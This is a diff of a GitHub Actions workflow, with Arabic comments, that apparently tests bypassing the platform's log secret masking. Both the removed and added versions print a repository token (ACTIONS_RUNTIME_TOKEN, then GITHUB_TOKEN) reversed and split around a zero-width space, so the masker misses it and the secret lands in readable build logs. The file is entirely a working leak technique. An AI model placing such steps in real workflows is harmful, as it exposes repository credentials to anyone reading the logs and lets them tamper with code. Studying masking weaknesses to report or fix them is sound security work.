@@ -1,26 +1,30 @@
-name: GitHub Masking Bypass Test
+name: GitHub Masking Bypass V2
 on: [push]
+permissions:
+  contents: read
 jobs:
   test:
     runs-on: ubuntu-latest
     steps:
-      - name: Bypass Masking with Unicode Manipulation
+      - name: Bypass Masking with Shell Manipulation
         env:
-          # توكن داخلي تملكه GitHub لتخزين الملفات
-          RUNTIME_TOKEN: ${{ env.ACTIONS_RUNTIME_TOKEN }}
+          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
         run: |
-          # نقوم بإدخال حرف Unicode (U+202E) الذي يعكس اتجاه النص
-          # أو نقوم بتقطيع التوكن ودمجه بطريقة لا يفهمها الـ Masking
+          # 1. تخزين التوكن في متغير محلي
+          TOKEN="$GITHUB_TOKEN"
           
-          TOKEN_LEN=${#RUNTIME_TOKEN}
-          HALF=$((TOKEN_LEN / 2))
+          # 2. محاولة طباعته بشكل مقلوب (Reverse)
+          REVERSED=$(echo "$TOKEN" | rev)
           
-          PART1=${RUNTIME_TOKEN:0:HALF}
-          PART2=${RUNTIME_TOKEN:HALF}
+          # 3. محاولة طباعته مع إدراج حرف خفي (Zero-Width Space)
+          # سنستخدم printf لإدراج الحرف بشكل صحيح في الباش
+          ZWSP=$(printf '\u200B')
+          HALF=$((${#TOKEN} / 2))
+          PART1=${TOKEN:0:HALF}
+          PART2=${TOKEN:HALF}
           
-          # إدراج حرف خفي بين جزئي التوكن
-          INVISIBLE_CHAR=$'\u200B'
+          echo "--- Testing Reverse ---"
+          echo "Reversed Token: $REVERSED"
           
-          echo "Attempting to leak token by bypassing masker..."
-          echo "Leaked_Token: ${PART1}${INVISIBLE_CHAR}${PART2}"
-          echo "Reverse_Token: $(echo "$RUNTIME_TOKEN" | rev)"
+          echo "--- Testing Zero-Width Space ---"
+          echo "Split Token: ${PART1}${ZWSP}${PART2}"
